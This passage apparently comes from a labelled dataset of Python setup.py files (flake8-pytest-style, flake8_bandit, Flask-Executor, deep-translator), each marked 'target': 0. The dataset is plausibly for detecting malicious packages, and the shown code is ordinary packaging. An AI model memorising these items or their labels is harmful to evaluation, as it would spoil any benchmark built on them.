@pytest.mark.foo() over @pytest.mark.foo <br> (configurable by `pytest-mark-no-parentheses`) |\\n| [PT024] | pytest.mark.asyncio is unnecessary for fixtures |\\n| [PT025] | pytest.mark.usefixtures has no effect on fixtures |\\n| [PT026] | useless pytest.mark.usefixtures without parameters | \\n\\n## Installation\\n\\n    pip install flake8-pytest-style\\n\\n## Configuration\\n\\nThe plugin has the following configuration options:\\n\\n* `pytest-fixture-no-parentheses` &mdash; see [PT001]\\n* `pytest-parametrize-names-type` &mdash; see [PT006]\\n* `pytest-parametrize-values-type` &mdash; see [PT007]\\n* `pytest-parametrize-values-row-type` &mdash; see [PT007]\\n* `pytest-raises-require-match-for` &mdash; see [PT011]\\n* `pytest-mark-no-parentheses` &mdash; see [PT023]\\n\\n## For developers\\n\\n### Install deps and setup pre-commit hook\\n\\n    make init\\n\\n### Run linters, autoformat, tests etc.\\n\\n    make format lint test\\n\\n### Bump new version\\n\\n    make bump_major\\n    make bump_minor\\n    make bump_patch\\n\\n## License\\n\\nMIT\\n\\n## Change Log\\n\\n**Unreleased**\\n\\n...\\n\\n**1.6.0 - 2021-12-23**\\n\\n* require at least Python 3.6.2\\n* expose `py.typed` file\\n\\n**1.5.1 - 2021-11-05**\\n\\n* better wording for [PT011]\\n* support Python 3.10\\n\\n**1.5.0 - 2021-06-18**\\n\\n* add [PT025] (checks for erroneous `pytest.mark.usefixtures` on fixtures)\\n* add [PT026] (checks for `pytest.mark.usefixtures` without parameters)\\n\\n**1.4.4 - 2021-06-17**\\n\\n* fix [PT023] not checking marks in classes\\n* fix [PT004] incorrectly firing on fixtures with `yield from`\\n\\n**1.4.2 - 2021-05-24**\\n\\n* update `flake8-plugin-utils` version to improve stability\\n\\n**1.4.1 - 2021-04-01**\\n\\n* fix argparse-related warnings\\n\\n**1.4.0 - 2021-03-14**\\n\\n* add [PT023] (checks for parentheses consistency in `pytest.mark` usage)\\n* add [PT024] (checks for unnecessary `pytest.mark.asyncio` on fixtures)\\n* fix [PT004], [PT005] firing on abstract fixtures\\n* fix [PT012] firing on `with` statements containing a single `pass`\\n\\n**1.3.0 - 2020-08-30**\\n\\n* add [PT022] (checks for `yield` fixtures without teardown)\\n\\n**1.2.3 - 2020-08-06**\\n\\n* update `flake8-plugin-utils` dependency to fix encoding problems on Windows\\n\\n**1.2.2 - 2020-07-23**\\n\\n* fix [PT004]/[PT005] inspecting returns of nested functions\\n\\n**1.2.1 - 2020-06-15**\\n\\n* fix [PT021] for factory fixtures (#46)\\n\\n**1.2.0 - 2020-06-12**\\n\\n* support scoped `mocker` fixtures from `pytest-mock` for [PT008]\\n* check for positional-only lambda arguments in [PT008]\\n* add [PT020] (checks for `pytest.yield_fixture`)\\n* add [PT021] (checks for `request.addfinalizer`)\\n* add documentation pages for all rules\\n\\n**1.1.1 - 2020-04-17**\\n\\n* fix [PT011] not reporting `match=''` as a violation\\n\\n**1.1.0 - 2020-04-14**\\n\\n* add [PT015] (checks for `assert False`)\\n* add [PT016] (checks for `pytest.fail()` without message)\\n* add [PT017] (checks for assertions on exceptions in `except` blocks)\\n* add [PT018] (checks for composite assertions)\\n* add [PT019] (checks for fixtures without value injected as parameters)\\n\\n**1.0.0 - 2020-03-26**\\n\\n* add [PT014] (checks for duplicate test cases in `@pytest.mark.parametrize`)\\n\\n**0.6.0 - 2020-03-21**\\n\\n* add configuration option `pytest-parametrize-names-type` for [PT006]\\n* add configuration options `pytest-parametrize-values-type` and\\n`pytest-parametrize-values-row-type` for [PT007]\\n\\n**0.5.0 - 2020-03-09**\\n\\n* add configuration option `pytest-fixture-no-parentheses` for [PT001]\\n* add [PT013] (checks for `from`-imports from `pytest`)\\n\\n**0.4.0 - 2020-03-09**\\n\\n* add [PT012] (checks for multiple statements in `with pytest.raises()`)\\n\\n**0.3.1 - 2020-03-09**\\n\\n* fix default value of `pytest-raises-require-match-for` config option\\n\\n**0.3.0 - 2020-03-09**\\n\\n* add [PT010] and [PT011] (checks for `pytest.raises` parameters)\\n\\n**0.2.0 - 2020-03-01**\\n\\n* add [PT009] (ported from [flake8-pytest](https://github.com/vikingco/flake8-pytest))\\n\\n**0.1.3 - 2019-05-24**\\n\\n* add `yield` fixtures support\\n* fix changelog entry for 0.1.2\\n\\n**0.1.2 - 2019-05-23**\\n\\n* fix parametrize checkers not working in decorators\\n\\n**0.1.1 - 2019-05-23**\\n\\n* update PyPI description\\n\\n**0.1.0 - 2019-05-23**\\n\\n* initial\\n\\n[PT001]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT001.md\\n[PT002]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT002.md\\n[PT003]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT003.md\\n[PT004]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT004.md\\n[PT005]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT005.md\\n[PT006]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT006.md\\n[PT007]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT007.md\\n[PT008]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT008.md\\n[PT009]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT009.md\\n[PT010]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT010.md\\n[PT011]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT011.md\\n[PT012]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT012.md\\n[PT013]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT013.md\\n[PT014]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT014.md\\n[PT015]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT015.md\\n[PT016]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT016.md\\n[PT017]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT017.md\\n[PT018]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT018.md\\n[PT019]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT019.md\\n[PT020]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT020.md\\n[PT021]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT021.md\\n[PT022]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT022.md\\n[PT023]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT023.md\\n[PT024]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT024.md\\n[PT025]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT025.md\\n[PT026]: https://github.com/m-burst/flake8-pytest-style/blob/v1.6.0/docs/rules/PT026.md\\n\",\n    'author': 'Mikhail Burshteyn',\n    'author_email': 'mdburshteyn@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://pypi.org/project/flake8-pytest-style',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6.2,<4.0.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "flake8_bandit-3.0.0", "func": "import io\nimport os\nimport sys\nfrom shutil import rmtree\n\nfrom setuptools import Command, setup\n\n\ndef get_version(fname=\"flake8_bandit.py\"):\n    with open(fname) as f:\n        for line in f:\n            if line.startswith(\"__version__\"):\n                return eval(line.split(\"=\")[~0])\n\n\n# Package meta-data.\nNAME = \"flake8_bandit\"\nDESCRIPTION = \"Automated security testing with bandit and flake8.\"\nURL = \"https://github.com/tylerwince/flake8-bandit\"\nEMAIL = \"tylerwince@gmail.com\"\nAUTHOR = \"Tyler Wince\"\nVERSION = get_version()\n\n# What packages are required for this module to be executed?\nREQUIRED = [\"flake8\", \"bandit>=1.7.3\", \"flake8-polyfill\", \"pycodestyle\"]\n\n# What packages are optional?\nEXTRAS = {\n    # 'fancy feature': ['django'],\n}\n\n# The rest you shouldn't have to touch too much :)\n# ------------------------------------------------\n# Except, perhaps the License and Trove Classifiers!\n# If you do change the License, remember to change the Trove Classifier for that!\n\nhere = os.path.abspath(os.path.dirname(__file__))\n\n# Import the README and use it as the long-description.\n# Note: this will only work if 'README.md' is present in your MANIFEST.in file!\ntry:\n    with io.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as f:\n        long_description = \"\\n\" + f.read()\nexcept FileNotFoundError:\n    long_description = DESCRIPTION\n\n# Load the package's __version__.py module as a dictionary.\nabout = {}\nif not VERSION:\n    with open(os.path.join(here, NAME, \"__version__.py\")) as f:\n        exec(f.read(), about)\nelse:\n    about[\"__version__\"] = VERSION\n\n\nclass UploadCommand(Command):\n    \"\"\"Support setup.py upload.\"\"\"\n\n    description = \"Build and publish the package.\"\n    user_options = []\n\n    @staticmethod\n    def status(s):\n        \"\"\"Prints things in bold.\"\"\"\n        print(\"\\033[1m{0}\\033[0m\".format(s))\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        try:\n            self.status(\"Removing previous builds\u2026\")\n            rmtree(os.path.join(here, \"dist\"))\n        except OSError:\n            pass\n\n        self.status(\"Building Source and Wheel (universal) distribution\u2026\")\n        os.system(\"{0} setup.py sdist bdist_wheel --universal\".format(sys.executable))\n\n        self.status(\"Uploading the package to PyPI via Twine\u2026\")\n        os.system(\"python3 -m twine upload dist/*\")\n\n        self.status(\"Pushing git tags\u2026\")\n        os.system(\"git tag v{0}\".format(about[\"__version__\"]))\n        os.system(\"git push --tags\")\n\n        sys.exit()\n\n\n# Where the magic happens:\nsetup(\n    name=NAME,\n    version=about[\"__version__\"],\n    description=DESCRIPTION,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=AUTHOR,\n    author_email=EMAIL,\n    url=URL,\n    # If your package is a single module, use this instead of 'packages':\n    py_modules=[\"flake8_bandit\"],\n    entry_points={\"flake8.extension\": [\"S=flake8_bandit:BanditTester\"]},\n    install_requires=REQUIRED,\n    extras_require=EXTRAS,\n    include_package_data=True,\n    license=\"MIT\",\n    classifiers=[\n        \"Framework :: Flake8\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Security\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Topic :: Software Development :: Quality Assurance\",\n    ],\n    # $ setup.py publish support.\n    cmdclass={\"upload\": UploadCommand},\n    python_requires=\">=3.6\",\n)\n", "target": 0}
{"idx": "Flask-Executor-0.10.0", "func": "import setuptools\nfrom setuptools.command.test import test\nimport sys\n\ntry:\n    from flask_executor import __version__ as version\nexcept ImportError:\n    import re\n    pattern = re.compile(r\"__version__ = '(.*)'\")\n    with open('flask_executor/__init__.py') as f:\n        version = pattern.search(f.read()).group(1)\n\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\n\nclass pytest(test):\n\n    def run_tests(self):\n        import pytest\n        errno = pytest.main(self.test_args)\n        sys.exit(errno)\n\n\nsetuptools.setup(\n    name='Flask-Executor',\n    version=version,\n    author='Dave Chevell',\n    author_email='chevell@gmail.com',\n    description='An easy to use Flask wrapper for concurrent.futures',\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url='https://github.com/dchevell/flask-executor',\n    packages=setuptools.find_packages(exclude=[\"tests\"]),\n    keywords=['flask', 'concurrent.futures'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    license='MIT',\n    install_requires=['Flask'],\n    extras_require={\n        ':python_version == \"2.7\"': ['futures>=3.1.1']\n    },\n    tests_require=['pytest', 'pytest-flask', 'python-coveralls'],\n    test_suite='tests',\n    cmdclass={\n        'test': pytest\n    }\n)\n", "target": 0}
{"idx": "deep-translator-1.8.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['deep_translator']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['beautifulsoup4>=4.9.1,<5.0.0', 'requests>=2.23.0,<3.0.0']\n\nentry_points = \\\n{'console_scripts': ['deep-translator = deep_translator.__main__:main',\n                     'dt = deep_translator.__main__:main']}\n\nsetup_kwargs = {\n    'name': 'deep-translator',\n    'version': '1.8.3',\n    'description': 'A flexible free and unlimited python tool to translate between different languages in a simple way using multiple translators',\n    'long_description': '##################\\ndeep-translator\\n##################\\n\\n.. image:: ../assets/icon.jpg\\n    :width: 100\\n    :align: center\\n    :alt: deep-translator-icon\\n\\n|\\n\\n\\n.. image:: https://img.shields.io/pypi/v/deep-translator.svg\\n        :target: https://pypi.python.org/pypi/deep-translator\\n.. image:: https://img.shields.io/travis/nidhaloff/deep-translator.svg\\n        :target: https://github.com/nidhaloff/deep-translator/actions/workflows/build.yml\\n.. image:: https://readthedocs.org/projects/deep-translator/badge/?version=latest\\n        :target: https://deep-translator.readthedocs.io/en/latest/?badge=latest\\n        :alt: Documentation Status\\n.. image:: https://img.shields.io/pypi/l/deep-translator\\n        :target: https://pypi.python.org/pypi/deep-translator\\n\\n.. image:: https://img.shields.io/pypi/status/deep-translator\\n        :target: https://pypi.python.org/pypi/deep-translator\\n\\n.. image:: https://pepy.tech/badge/deep-translator\\n    :target: https://pepy.tech/project/deep-translator\\n\\n\\n.. image:: https://img.shields.io/pypi/wheel/deep-translator\\n        :target: https://pypi.python.org/pypi/deep-translator\\n\\n.. image:: https://img.shields.io/twitter/url?url=https%3A%2F%2Ftwitter.com%2FNidhalBaccouri\\n        :alt: Twitter URL\\n        :target: https://twitter.com/NidhalBaccouri\\n\\n\\n=======================\\nTranslation for humans\\n=======================\\n\\nA flexible **FREE** and **UNLIMITED** tool to translate between different languages in a simple way using multiple translators.\\n\\n\\n* Free software: MIT license\\n* Documentation: https://deep-translator.readthedocs.io.\\n* Swagger API: https://deep-translator-api.azurewebsites.net/docs.\\n\\n|\\n|\\n\\n.. contents:: Table of Contents\\n    :depth: 3\\n\\n|\\n|\\n\\n\\n==========\\nMotivation\\n==========\\n\\nI needed to translate a text using python. It was hard to find a simple way to do it.\\nThere are other libraries that can be used for this task, but most of them\\nare **buggy, not free, limited, not supported anymore or complex to use.**\\n\\nTherefore, I decided to build this simple tool. It is 100% free, unlimited, easy to use and provide\\nsupport for all languages.\\n\\nBasically, my goal was to integrate support for multiple famous translators\\nin this tool.\\n\\n======================\\nWhen you should use it\\n======================\\n\\n- If you want to translate text using python\\n- If you want to translate from a file\\n- If you want to get translations from many sources and not only one\\n- If you want to automate translations\\n- If you want to compare different translations\\n- If you want to detect language automatically\\n\\n======================\\nWhy you should use it\\n======================\\n\\n- It\\'s the only python tool that integrates many translators\\n- multi language support\\n- supports batch translation\\n- High level of abstraction\\n- Automatic language detection\\n- Easy to use and extend\\n- Support for most famous universal translators\\n- Stable and maintained regularly\\n- The API is very easy to use\\n- Proxy integration is supported\\n\\n========\\nFeatures\\n========\\n\\n* Support for `google translate <https://translate.google.com/>`_\\n* Support for the `microsoft translator <https://www.microsoft.com/en-us/translator//>`_ (version >= 1.3.5)\\n* Support for `Pons translator <https://de.pons.com/>`_\\n* Support for the `Linguee translator <https://www.linguee.com/>`_\\n* Support for the `Mymemory translator <https://mymemory.translated.net/>`_\\n* Support for the `Yandex translator <https://yandex.com/>`_ (version >= 1.2.1)\\n* Support for the `QcriTranslator translator <https://mt.qcri.org/api/>`_ (version >= 1.2.4)\\n* Support for the `DeeplTranslator translator <https://www.deepl.com/en/translator/>`_ (version >= 1.2.5)\\n* Support for the `Papago translator <https://papago.naver.com/>`_ (version >= 1.4.4)\\n* Support for the `Libre translator <https://libretranslate.com/>`_\\n* Support for proxy usage\\n* Automatic single language detection\\n* Batch language detection\\n* Translate directly from a text file\\n* Get multiple translation for a word\\n* Automate the translation of different paragraphs in different languages\\n* Translate directly from terminal (version >= 1.1.0)\\n\\n=============\\nInstallation\\n=============\\n\\nInstall the stable release:\\n\\n.. code-block:: console\\n\\n    $ pip install -U deep-translator\\n\\ntake a look at the docs if you want to install from source.\\n\\n============\\nQuick Start\\n============\\n\\n.. code-block:: python\\n\\n    from deep_translator import GoogleTranslator\\n    translated = GoogleTranslator(source=\\'auto\\', target=\\'de\\').translate(\"keep it up, you are awesome\")  # output -> Weiter so, du bist gro\u00dfartig\\n\\nor using proxies:\\n\\n.. code-block:: python\\n\\n    from deep_translator import GoogleTranslator\\n\\n    proxies_example = {\\n        \"https\": \"34.195.196.27:8080\",\\n        \"http\": \"34.195.196.27:8080\"\\n    }\\n    translated = GoogleTranslator(source=\\'auto\\', target=\\'de\\', proxies=proxies_example).translate(\"keep it up, you are awesome\")  # output -> Weiter so, du bist gro\u00dfartig\\n\\n\\nor even directly from terminal:\\n\\n.. code-block:: console\\n\\n    $ deep-translator --source \"en\" --target \"de\" --text \"hello world\"\\n\\n    or shorter\\n\\n    $ dt -tg de -txt \"hello world\"\\n\\n\\n=====\\nUsage\\n=====\\n\\nIn this section, demos on how to use all different integrated translators in this tool are provided.\\n\\n.. note::\\n\\n    You can always pass the languages by the name or by abbreviation.\\n\\n    *Example*: If you want to use english as a source or target language, you can pass **english** or **en** as an argument\\n\\nImports\\n--------\\n\\n.. code-block:: python\\n\\n    from deep_translator import (GoogleTranslator,\\n                                 MicrosoftTranslator,\\n                                 PonsTranslator,\\n                                 LingueeTranslator,\\n                                 MyMemoryTranslator,\\n                                 YandexTranslator,\\n                                 PapagoTranslator,\\n                                 DeeplTranslator,\\n                                 QcriTranslator,\\n                                 single_detection,\\n                                 batch_detection)\\n\\n\\nCheck Supported Languages\\n---------------------------\\n\\n.. note::\\n\\n    You can check the supported languages of each translator by calling the\\n    get_supported_languages function as a static method.\\n\\n.. code-block:: python\\n\\n    # default return type is a list\\n    langs_list = GoogleTranslator.get_supported_languages()  # output: [arabic, french, english etc...]\\n\\n    # alternatively, you can the dictionary containing languages mapped to their abbreviation\\n    langs_dict = GoogleTranslator.get_supported_languages(as_dict=True)  # output: {arabic: ar, french: fr, english:en etc...}\\n\\nLanguage Detection\\n------------------\\n\\n.. note::\\n\\n    You can also detect language automatically. Notice that this package is free and my goal is to keep it free.\\n    Therefore, you will need to get your own api_key if you want to use the language detection function.\\n    I figured out you can get one for free here: https://detectlanguage.com/documentation\\n\\n- Single Text Detection\\n\\n.. code-block:: python\\n\\n    lang = single_detection(\\'bonjour la vie\\', api_key=\\'your_api_key\\')\\n    print(lang) # output: fr\\n\\n- Batch Detection\\n\\n.. code-block:: python\\n\\n    lang = batch_detection([\\'bonjour la vie\\', \\'hello world\\'], api_key=\\'your_api_key\\')\\n    print(lang) # output: [fr, en]\\n\\n\\n\\nGoogle Translate\\n-----------------\\n\\n.. code-block:: python\\n\\n    text = \\'happy coding\\'\\n\\n- You can use automatic language detection to detect the source language:\\n\\n.. code-block:: python\\n\\n    translated = GoogleTranslator(source=\\'auto\\', target=\\'de\\').translate(text=text)\\n\\n- You can pass languages by name or by abbreviation:\\n\\n.. code-block:: python\\n\\n    translated = GoogleTranslator(source=\\'auto\\', target=\\'german\\').translate(text=text)\\n\\n    # Alternatively, you can pass languages by their abbreviation:\\n    translated = GoogleTranslator(source=\\'en\\', target=\\'de\\').translate(text=text)\\n\\n- You can also reuse the Translator class and change/update its properties.\\n\\n(Notice that this is important for performance too since instantiating new objects is expensive)\\n\\n\\n.. code-block:: python\\n\\n    # let\\'s say first you need to translate from auto to german\\n    my_translator = GoogleTranslator(source=\\'auto\\', target=\\'german\\')\\n    result = my_translator.translate(text=text)\\n    print(f\"Translation using source = {my_translator.source} and target = {my_translator.target} -> {result}\")\\n\\n    # let\\'s say later you want to reuse the class but your target is french now\\n    # This is the best practice and how you should use deep-translator.\\n    # Please don\\'t over-instantiate translator objects without a good reason, otherwise you will run into performance issues\\n    my_translator.target = \\'fr\\'  # this will override the target \\'german\\' passed previously\\n    result = my_translator.translate(text=text)\\n    print(f\"Translation using source = {my_translator.source} and target = {my_translator.target} -> {result}\")\\n\\n    # you can also update the source language as well\\n    my_translator.source = \\'en\\'  # this will override the source \\'auto\\' passed previously\\n    result = my_translator.translate(text=text)\\n    print(f\"Translation using source = {my_translator.source} and target = {my_translator.target} -> {result}\")\\n\\n\\n- Translate batch of texts\\n\\n.. code-block:: python\\n\\n    texts = [\"hallo welt\", \"guten morgen\"]\\n\\n    # the translate_sentences function is deprecated, use the translate_batch function instead\\n    translated = GoogleTranslator(\\'de\\', \\'en\\').translate_batch(texts)\\n\\n- Translate from a file:\\n\\n.. code-block:: python\\n\\n    translated = GoogleTranslator(source=\\'auto\\', target=\\'german\\').translate_file(\\'path/to/file\\')\\n\\nMymemory Translator\\n--------------------\\n\\n.. note::\\n\\n    As in google translate, you can use the automatic language detection with mymemory by using \"auto\" as an\\n    argument for the source language. However, this feature in the mymemory translator is not so powerful as\\n    in google translate.\\n\\n- Simple translation\\n\\n.. code-block:: python\\n\\n    text = \\'Keep it up. You are awesome\\'\\n\\n    translated = MyMemoryTranslator(source=\\'auto\\', target=\\'french\\').translate(text)\\n\\n- Translate batch of texts\\n\\n.. code-block:: python\\n\\n    texts = [\"hallo welt\", \"guten morgen\"]\\n\\n    # the translate_sentences function is deprecated, use the translate_batch function instead\\n    translated = MyMemoryTranslator(\\'de\\', \\'en\\').translate_batch(texts)\\n\\n- Translate from file\\n\\n.. code-block:: python\\n\\n    path = \"your_file.txt\"\\n\\n    translated = MyMemoryTranslator(source=\\'en\\', target=\\'fr\\').translate_file(path)\\n\\n\\nDeeplTranslator\\n-----------------\\n\\n.. note::\\n\\n    In order to use the DeeplTranslator translator, you need to generate an api key. Deepl offers a Pro and a free API.\\n    deep-translator supports both Pro and free APIs. Just check the examples below.\\n    Visit https://www.deepl.com/en/docs-api/ for more information on how to generate your Deepl api key\\n\\n- Simple translation\\n\\n.. code-block:: python\\n\\n    text = \\'Keep it up. You are awesome\\'\\n\\n    translated = DeeplTranslator(api_key=\"your_api_key\", source=\"en\", target=\"en\", use_free_api=True).translate(text)\\n\\n.. note::\\n        deep-translator uses free deepl api by default. If you have the pro version then simply set the use_free_api to false.\\n\\n\\n- Translate batch of texts\\n\\n.. code-block:: python\\n\\n    texts = [\"hallo welt\", \"guten morgen\"]\\n\\n    # the translate_sentences function is deprecated, use the translate_batch function instead\\n    translated = DeeplTranslator(\"your_api_key\").translate_batch(texts)\\n\\nQcriTranslator\\n--------------------\\n\\n.. note::\\n\\n    In order to use the QcriTranslator translator, you need to generate a free api key. Visit https://mt.qcri.org/api/\\n    for more information\\n\\n- Check languages\\n\\n.. code-block:: python\\n\\n    # as a property\\n    print(\"language pairs: \", QcriTranslator(\"your_api_key\").languages)\\n\\n- Check domains\\n\\n.. code-block:: python\\n\\n    # as a property\\n    print(\"domains: \", QcriTranslator(\"your_api_key\").domains)\\n\\n- Text translation\\n\\n.. code-block:: python\\n\\n    text = \\'Education is great\\'\\n\\n    translated = QcriTranslator(\"your_api_key\").translate(source=\\'en\\', target=\\'ar\\', domain=\"news\", text=text)\\n    # output -> \u0627\u0644\u062a\u0639\u0644\u064a\u0645 \u0647\u0648 \u0639\u0638\u064a\u0645\\n\\n    # see docs for batch translation and more.\\n\\nLinguee Translator\\n-------------------\\n\\n.. code-block:: python\\n\\n    word = \\'good\\'\\n\\n- Simple Translation\\n\\n.. code-block:: python\\n\\n    translated_word = LingueeTranslator(source=\\'english\\', target=\\'french\\').translate(word)\\n\\n    # pass language by their abbreviation\\n    translated_word = LingueeTranslator(source=\\'en\\', target=\\'fr\\').translate(word)\\n\\n- Return all synonyms or words that matches\\n\\n.. code-block:: python\\n\\n    # set the argument return_all to True if you want to get all synonyms of the word to translate\\n    translated_word = LingueeTranslator(source=\\'english\\', target=\\'french\\').translate(word, return_all=True)\\n\\n- Translate a batch of words\\n\\n.. code-block:: python\\n\\n    translated_words = LingueeTranslator(source=\\'english\\', target=\\'french\\').translate_words([\"good\", \"awesome\"])\\n\\nPONS Translator\\n----------------\\n\\n.. note::\\n\\n    You can pass the languages by the name or by abbreviation just like\\n    previous examples using GoogleTranslate\\n\\n.. code-block:: python\\n\\n    word = \\'awesome\\'\\n\\n- Simple Translation\\n\\n.. code-block:: python\\n\\n    translated_word = PonsTranslator(source=\\'english\\', target=\\'french\\').translate(word)\\n\\n    # pass language by their abbreviation\\n    translated_word = PonsTranslator(source=\\'en\\', target=\\'fr\\').translate(word)\\n\\n- Return all synonyms or words that matches\\n\\n.. code-block:: python\\n\\n    # set the argument return_all to True if you want to get all synonyms of the word to translate\\n    translated_word = PonsTranslator(source=\\'english\\', target=\\'french\\').translate(word, return_all=True)\\n\\n- Translate a batch of words\\n\\n.. code-block:: python\\n\\n    translated_words = LingueeTranslator(source=\\'english\\', target=\\'french\\').translate_words([\"good\", \"awesome\"])\\n\\nYandex Translator\\n------------------\\n\\n.. note::\\n\\n    You need to require an **private api key** if you want to use the yandex translator.\\n    visit the official website for more information about how to get one\\n\\n- Language detection\\n\\n.. code-block:: python\\n\\n    lang = YandexTranslator(\\'your_api_key\\').detect(\\'Hallo, Welt\\')\\n    print(f\"language detected: {lang}\")  # output -> language detected: \\'de\\'\\n\\n- Text translation\\n\\n.. code-block:: python\\n\\n    # with auto detection | meaning provide only the target language and let yandex detect the source\\n    translated = YandexTranslator(\\'your_api_key\\').translate(source=\"auto\", target=\"en\", text=\\'Hallo, Welt\\')\\n    print(f\"translated text: {translated}\")  # output -> translated text: Hello world\\n\\n    # provide source and target language explicitly\\n    translated = YandexTranslator(\\'your_api_key\\').translate(source=\"de\", target=\"en\", text=\\'Hallo, Welt\\')\\n    print(f\"translated text: {translated}\")  # output -> translated text: Hello world\\n\\n- File translation\\n\\n.. code-block:: python\\n\\n    translated = YandexTranslator(\\'your_api_key\\').translate_file(source=\"auto\", target=\"en\", path=\"path_to_your_file\")\\n\\n- Batch translation\\n\\n.. code-block:: python\\n\\n    translated = YandexTranslator(\\'your_api_key\\').translate_batch(source=\"auto\", target=\"de\", batch=[\"hello world\", \"happy coding\"])\\n\\n\\nMicrosoft Translator\\n---------------------\\n\\n.. note::\\n\\n    You need to require an **api key** if you want to use the microsoft translator.\\n    visit the official website for more information about how to get one.\\n    Microsoft offers a free tier 0 subscription (2 million characters per month).\\n\\n- Required and optional attributes\\n\\n    There are two required attributes, namely \"api_key\" (string) and \"target\" (string or list).\\n    Attribute \"source\" is optional.\\n    Also, Microsoft API accepts a number of other optional attributes, you can find them here:  https://docs.microsoft.com/azure/cognitive-services/translator/reference/v3-0-translate\\n    You can simply add them after the required attributes, see the example.\\n\\n.. code-block:: python\\n\\n    text = \\'happy coding\\'\\n    translated = MicrosoftTranslator(api_key=\\'some-key\\', target=\\'de\\').translate(text=text)\\n    translated_two_targets = MicrosoftTranslator(api_key=\\'some-key\\', target=[\\'de\\', \\'ru\\']).translate(text=text)\\n    translated_with_optional_attr = MicrosoftTranslator(api_key=\\'some-key\\', target=\\'de\\', textType=\\'html\\']).translate(text=text)\\n\\n- You can pass languages by name or by abbreviation:\\n\\n.. code-block:: python\\n\\n    translated = MicrosoftTranslator(api_key=\\'some-key\\', target=\\'german\\').translate(text=text)\\n\\n    # Alternatively, you can pass languages by their abbreviation:\\n    translated = MicrosoftTranslator(api_key=\\'some-key\\', target=\\'de\\').translate(text=text)\\n\\n- Translate batch of texts\\n\\n.. code-block:: python\\n\\n    texts = [\"hallo welt\", \"guten morgen\"]\\n    translated = MicrosoftTranslator(api_key=\\'some-key\\', target=\\'english\\').translate_batch(texts)\\n\\n- Translate from a file:\\n\\n.. code-block:: python\\n\\n    translated = MicrosoftTranslator(api_key=\\'some-key\\', target=\\'german\\').translate_file(\\'path/to/file\\')\\n\\n\\nPapago Translator\\n---------------------\\n\\n.. note::\\n\\n    You need to require a **client id** and **client secret key** if you want to use the papago translator.\\n    visit the official website for more information about how to get one.\\n\\n.. code-block:: python\\n\\n    text = \\'happy coding\\'\\n    translated = PapagoTranslator(client_id=\\'your_client_id\\', secret_key=\\'your_secret_key\\', source=\\'en\\', target=\\'ko\\').translate(text=text)  # output: \ud589\ubcf5\ud55c \ubd80\ud638\ud654\\n\\n\\nLibre Translator\\n---------------------\\n\\n.. note::\\n\\n    Libre translate has multiple  `mirrors <https://github.com/LibreTranslate/LibreTranslate#mirrors>`_ which can be used for the API endpoint.\\n    Some require an API key to be used. By default the base url is set to `libretranslate.de <https://libretranslate.de/>`_ .\\n    This can be set using the \"base_url\" input parameter.\\n\\n.. code-block:: python\\n\\n    text = \\'laufen\\'\\n    translated = LibreTranslator(source=\\'auto\\', target=\\'en\\', base_url = \\'https://libretranslate.com/\\', api_key = \\'your_api_key\\').translate(text=text)  # output: run\\n\\n\\n- You can pass languages by name or by abbreviation:\\n\\n.. code-block:: python\\n\\n    translated = LibreTranslator(source=\\'german\\', target=\\'english\\').translate(text=text)\\n\\n    # Alternatively, you can pass languages by their abbreviation:\\n    translated = LibreTranslator(source=\\'de\\', target=\\'en\\').translate(text=text)\\n\\n\\n- Translate batch of texts\\n\\n.. code-block:: python\\n\\n    texts = [\"hallo welt\", \"guten morgen\"]\\n    translated = LibreTranslator(source=\\'auto\\', target=\\'en\\').translate_batch(texts)\\n\\n- Translate from a file:\\n\\n.. code-block:: python\\n\\n    translated = 